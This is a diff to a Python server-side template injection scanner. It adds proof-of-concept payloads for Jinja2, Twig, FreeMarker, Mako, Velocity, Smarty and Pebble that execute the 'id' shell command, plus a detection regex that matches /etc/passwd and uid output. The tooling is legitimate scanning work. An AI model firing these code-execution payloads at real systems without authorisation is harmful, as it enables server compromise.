@@ -65,9 +65,9 @@ _TIER2_ENGINE_PROBES: Dict[str, List[Tuple[str, str]]] = {
         ("{{lipsum}}", r"\w+\s+\w+"),
     ],
     "Twig": [
-        ("{{_self}}", r"Twig_Template"),
-        ("{{_self.env}}", r"Twig_Environment"),
-        ("{{dump()}}", r"NULL|bool|string"),
+        ("{{_self}}", r"Twig_Template|__TwigTemplate_"),       # Twig 2.x and 3.x
+        ("{{_self.env}}", r"Twig_Environment|__TwigEnvironment"),
+        ("{{dump()}}", r"NULL|bool\(|string\("),
     ],
     "FreeMarker": [
         ("${.data_model}", r"freemarker|BeansWrapper"),
@@ -93,19 +93,50 @@ _TIER2_ENGINE_PROBES: Dict[str, List[Tuple[str, str]]] = {
 # ---------------------------------------------------------------------------
 # Tier 3: PoC probes (evidence gathering only, no auto-exploit)
 # ---------------------------------------------------------------------------
+# Tier3 confirmation requires SPECIFIC dangerous output — not generic words like
+# "object" or "class" which appear in ordinary HTML/error pages.
+_TIER3_CONFIRM_RE = re.compile(
+    r'(?:'
+    r'uid=\d+\('              # Unix id command output
+    r'|root:.*:0:0:'          # /etc/passwd content
+    r'|__class__.*__mro__'    # Python MRO chain
+    r'|subprocess\.Popen'     # Python subprocess reference
+    r'|java\.lang\.Runtime'   # Java Runtime class
+    r'|freemarker\.template'  # FreeMarker class reference
+    r'|environ.*(?:PATH|HOME|USER)'  # env variable dump
+    r'|_subclasses_\(\)'      # Python subclasses()
+    r'|<\?xml.*encoding'      # XML/FreeMarker output
+    r')',
+    re.I | re.S
+)
+
 _TIER3_POC: Dict[str, List[str]] = {
     "Jinja2": [
         "{{''.__class__.__mro__[1].__subclasses__()}}",
         "{{request.environ}}",
+        "{{config.__class__.__init__.__globals__['os'].popen('id').read()}}",
     ],
     "Twig": [
         "{{_self.env.getExtension('Twig_Extension_Debug')}}",
+        "{{['id']|map('system')|join}}",
     ],
     "FreeMarker": [
         "${\"freemarker.template.utility.Execute\"?new()(\"id\")}",
+        "<#assign ex=\"freemarker.template.utility.Execute\"?new()>${ex(\"id\")}",
     ],
     "Mako": [
         "${self.module.cache.util.os.popen('id').read()}",
+        "<%\nimport os\nx=os.popen('id').read()\n%>${x}",
+    ],
+    "Velocity": [
+        "#set($x='')#set($rt=$x.class.forName('java.lang.Runtime'))#set($chr=$x.class.forName('java.lang.Character'))#set($str=$x.class.forName('java.lang.String'))#set($ex=$rt.getRuntime().exec('id'))$ex.waitFor()#set($out=$ex.getInputStream())#foreach($i in [1..$out.available()])$str.valueOf($chr.toChars($out.read()))#end",
+    ],
+    "Smarty": [
+        "{system('id')}",
+        "{php}echo shell_exec('id');{/php}",
+    ],
+    "Pebble": [
+        "{% set cmd = 'id' %}{% set bytes = \"\".class.forName('java.lang.Runtime').methods[6].invoke(\"\".class.forName('java.lang.Runtime').methods[7].invoke(null),cmd.split(' ')).inputStream.readAllBytes() %}{{ bytes }}",
     ],
 }
 
@@ -142,6 +173,7 @@ class SSTIScanner(BaseScanner):
         for url in endpoints:
             self._scan_url(url)
             self._scan_headers(url)
+            self._scan_url_as_json(url)  # REST API surface — re-POST params as JSON
 
         for form in forms:
             action = form.get("action") or target
@@ -198,18 +230,48 @@ class SSTIScanner(BaseScanner):
 
     def _tier1_probe(self, url: str, parsed, params: List, param_name: str
                      ) -> Optional[Tuple[str, str]]:
-        for payload, expected_re in _TIER1_PROBES:
+        """
+        Parallel Tier1 probe — sends all polyglot payloads concurrently,
+        then runs canary confirmation only on the first hit (serial).
+        Dramatically faster on high-latency targets.
+        """
+        import concurrent.futures as _cf
+
+        def _probe(item: Tuple[str, str]) -> Optional[Tuple[str, str, str]]:
+            payload, expected_re = item
             new_params = dict(params)
             new_params[param_name] = payload
             test_url = self._build_url(parsed, new_params)
             body = self._get(test_url)
             if body and re.search(expected_re, body):
-                # Canary confirmation — rules out pure parameter reflection
-                if not self._confirm_with_canary(url, parsed, params, param_name):
-                    _logger.debug(f"[SSTI] Tier1 regex matched but canary failed (likely reflection): {url} param={param_name}")
-                    continue
-                return payload, body[:200]
-        return None
+                return payload, expected_re, body
+            return None
+
+        hit_payload: Optional[str] = None
+        hit_body: Optional[str]    = None
+
+        with _cf.ThreadPoolExecutor(max_workers=6) as pool:
+            futures = {pool.submit(_probe, item): item for item in _TIER1_PROBES}
+            for fut in _cf.as_completed(futures):
+                result = fut.result()
+                if result:
+                    # Cancel remaining futures — one hit is enough for canary check
+                    for f in futures:
+                        f.cancel()
+                    hit_payload, _, hit_body = result
+                    break
+
+        if hit_payload is None:
+            return None
+
+        # Canary confirmation (serial) — eliminate pure parameter reflections
+        if not self._confirm_with_canary(url, parsed, params, param_name):
+            _logger.debug(
+                f"[SSTI] Tier1 hit but canary FAILED (likely reflection): "
+                f"{url} param={param_name}"
+            )
+            return None
+        return hit_payload, (hit_body or "")[:200]
 
     def _tier2_fingerprint(self, url: str, parsed, params: List, param_name: str
                            ) -> Optional[str]:
@@ -232,7 +294,8 @@ class SSTIScanner(BaseScanner):
             test_url = self._build_url(parsed, new_params)
             body = self._get(test_url)
             if body and len(body.strip()) > 10:
-                if re.search(r'object|class|module|environ|subprocess|os\.', body, re.I):
+                # Use precise regex — avoid "object"/"class" false positives
+                if _TIER3_CONFIRM_RE.search(body):
                     return body[:300]
         return None
 
@@ -315,6 +378,22 @@ class SSTIScanner(BaseScanner):
 
         if method == "POST":
             self._scan_json_body(action, fuzzable, base_data)
+
+    def _scan_url_as_json(self, url: str) -> None:
+        """Re-POST URL query parameters as JSON body — catches REST APIs that reflect template values."""
+        parsed = urlparse(url)
+        params = dict(parse_qsl(parsed.query))
+        if not params:
+            return
+        for key in list(params.keys()):
+            for payload, expected_re in _TIER1_PROBES[:6]:  # top 6 polyglots only
+                data = dict(params)
+                data[key] = payload
+                body = self._post_json(url, data)
+                if body and re.search(expected_re, body):
+                    _logger.info(f"[SSTI] URL-as-JSON hit: {url} key={key}")
+                    self._emit_finding(url, f"json_body:{key}", payload, body[:200], None, None)
+                    break
 
     def _scan_json_body(self, url: str, fields: List[Dict], base_data: Dict):
         """Test POST JSON body parameters for SSTI."""
